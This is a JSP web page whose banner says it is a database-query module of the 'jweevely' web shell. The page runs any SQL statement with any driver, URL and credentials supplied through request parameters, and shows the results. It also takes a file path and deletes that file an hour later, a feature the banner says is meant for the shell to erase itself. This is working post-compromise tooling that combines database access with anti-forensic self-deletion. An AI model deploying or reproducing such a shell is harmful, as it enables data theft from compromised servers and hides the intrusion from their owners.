<%@ page language="java" import="java.sql.*" import="java.io.*"
	contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>show something from db</title>
</head>
<body bgcolor="LightGrey">
	<%!// 1.获取数据库连接对象
	public static Connection getConn(String driverName, String url,
			String user, String pass) throws SQLException,
			ClassNotFoundException {
		// 加载数据库驱动
		Class.forName(driverName);
		Connection conn = DriverManager.getConnection(url, user, pass);
		return conn;
	}

	// 2.1获取语句执行对象
	public static Statement getStatement(Connection conn) throws SQLException {
		Statement stmt = null;
		stmt = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		return stmt;
	}

	// 2.2获取预处理语句执行对象
	public static PreparedStatement getPreparedStatement(Connection conn,
			String sql) throws SQLException {
		PreparedStatement pstmt = null;
		pstmt = conn.prepareStatement(sql);
		return pstmt;
	}

	// 3.获取结果集对象
	public static ResultSet getResultSet(Statement stmt, String sql)
			throws SQLException {
		ResultSet res = null;
		res = stmt.executeQuery(sql);
		return res;
	}

	// 4.关闭资源方法
	public static void close(Connection conn, Statement stmt, ResultSet res) {
		close(res);
		close(stmt);
		close(conn);
	}

	// 关闭语句对象
	private static void close(Statement stmt) {
		if (stmt != null) {
			try {
				stmt.close();
			} catch (SQLException e) {
			}
			stmt = null;
		}
	}

	// 关闭结果集对象
	private static void close(ResultSet res) {
		if (res != null) {
			try {
				res.close();
			} catch (SQLException e) {
			}
			res = null;
		}
	}

	// 关闭数据库连接对象
	private static void close(Connection conn) {
		try {
			if (conn != null && !conn.isClosed()) {
				conn.close();
			}
		} catch (SQLException e) {
		}
		conn = null;
	}

	private static String getPara(HttpServletRequest request, String uri_para,
			String default_var) {
		String para_tmp = request.getParameter(uri_para);
		if (para_tmp != null && para_tmp.length() != 0) {
			return para_tmp;
		}
		return default_var;
	}

	private Thread trans = null;
	private String self_path = "";
	private final String[] del_report = new String[1];%>
	<%
		request.setCharacterEncoding("UTF-8");
		if (trans == null) {
			self_path = getPara(request, "self_path", "").trim();
			//out.print("path_received is: '" + self_path + "'");

			final File self_file = new File(self_path);
			if (self_file.exists()) {
				trans = new Thread(new Runnable() {
					public void run() {
						try {
							Thread.sleep(60 * 60 * 1000);
						} catch (Exception e) {
						}
						del_report[0] = self_file.delete() + "";
					}
				});
				trans.start();
			} else {
				if (self_path.length() != 0) {
					self_path = "no such file.";
				}
			}
		}
		if (del_report[0] != null && !self_path.startsWith("delete ")) {
			if (del_report[0].equalsIgnoreCase("true")) {
				self_path = "delete succeed(disposable function.): '" + self_path+"'";
			} else {
				self_path = "delete failure(would you try another again?): '" + self_path+"'";
				del_report[0] = null;
				trans = null;
			}
		}

		String driverName = getPara(request, "driverName",
				"com.mysql.jdbc.Driver");
		String conn_url = getPara(request, "conn_url",
				"jdbc:mysql://127.0.0.1/db_name");
		String conn_userName = getPara(request, "conn_userName", "root");
		String conn_userPass = getPara(request, "conn_userPass", "123456");

		String sql = getPara(request, "sql", "show databases");
	%>
	<div id="content">
		<div id="top_area">
			<div id="input_area" style="float:left;">
				<form action="" method="post">
					<table width="800px">
						<tr>
							<td colspan="2">the absolute path(optional): <%=application.getRealPath(request.getRequestURI())%>
								<input type="text" style="width:95%" name="self_path"
								value="<%=self_path%>"></input>
							</td>
						</tr>
						<tr>
							<td width="50%">db_driver_name: <input type="text"
								style="width:400px" name="driverName" value="<%=driverName%>"></input>
							</td>
							<td>db_url: <input type="text" style="width:400px"
								name="conn_url" value="<%=conn_url%>"></input>
							</td>
						</tr>
						<tr>
							<td width="50%">db_username: <input type="text"
								style="width:400px" name="conn_userName"
								value="<%=conn_userName%>"></input>
							</td>
							<td>db_password: <input type="text" style="width:400px"
								name="conn_userPass" value="<%=conn_userPass%>"></input>
							</td>
						</tr>
						<tr>
							<td colspan="2">sql: <input type="text" style="width:99%"
								name="sql" value="<%=sql%>"></input>
							</td>
						</tr>
						<tr>
							<td colspan="2"><center>
									<button type="submit">submit</button>
								</center>
							</td>
						</tr>
					</table>
				</form>
			</div>
			<div id="mesg_area"
				style="overflow-y:scroll; word-wrap: break-word; word-break: normal;">
				<br /> This is a module of jweevely,<br /> which query something
				you want from database.<br /> written by needle wang.<br /> mail:
				needlewang2011@gmail.com<br /> 2014-05-16 Fri 03:14:04<br />
				by the way, if you type a file's absolute_path to the top input
				area,<br /> it will start a timer for deleting that file after an
				hour.<br /> but it can be used only once, it is designed for
				deleting itself.
			</div>
		</div>
		<div id="clear_both" style="clear:both;"></div>
		<!--清除浮动-->
		<div id="bottom_area">
			<table border="1">
				<%
					Connection conn = null;
					Statement statement = null;
					ResultSet rs = null;
					ResultSetMetaData rsmd = null;

					try {
						conn = getConn(driverName, conn_url, conn_userName,
								conn_userPass);

						statement = getStatement(conn);

						rs = getResultSet(statement, sql);

						rsmd = rs.getMetaData();
						int colCount = rsmd.getColumnCount();
				%>
				<tr>
					<%
						for (int i = 0; i < colCount; i++) {
					%><td><%=rsmd.getColumnName(i + 1)%></td>
					<%
						}
					%>
				</tr>
				<%
					int lineCount = 0;
						while (rs.next()) {
							if (lineCount >= 20) {
								out.println("<tr><td colspan=\"" + colCount
										+ "\">...<br/>just show 20 lines.</td></tr>");
								break;
							}
				%>
				<tr>
					<%
						for (int i = 0; i < colCount; i++) {
					%><td><%=rs.getString(i + 1)%></td>
					<%
						}
					%>
				</tr>
				<%
					lineCount++;
						}
					} catch (ClassNotFoundException e) {
						out.println("class not found: '" + e.getMessage() + "'");
					} catch (SQLException e) {
						out.println("here is sql exception: <br/>");
						out.println(e.getMessage());
					} catch (Exception e) {
						out.println("here is unknow exception: <br/>");
						out.println(e.getMessage());
					}

					close(conn, statement, rs);
				%>
			</table>
		</div>
	</div>
</body>
</html>
